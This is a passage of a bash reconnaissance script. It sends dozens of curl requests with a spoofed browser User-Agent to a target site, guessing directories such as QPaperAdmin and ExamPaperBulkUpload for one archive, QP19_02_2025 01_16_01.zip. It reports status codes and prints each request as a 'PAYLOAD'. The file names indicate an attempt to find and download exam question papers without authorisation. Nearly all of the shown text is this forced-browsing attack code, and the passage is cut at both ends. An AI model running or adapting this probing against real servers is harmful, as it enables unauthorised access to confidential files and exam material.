payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
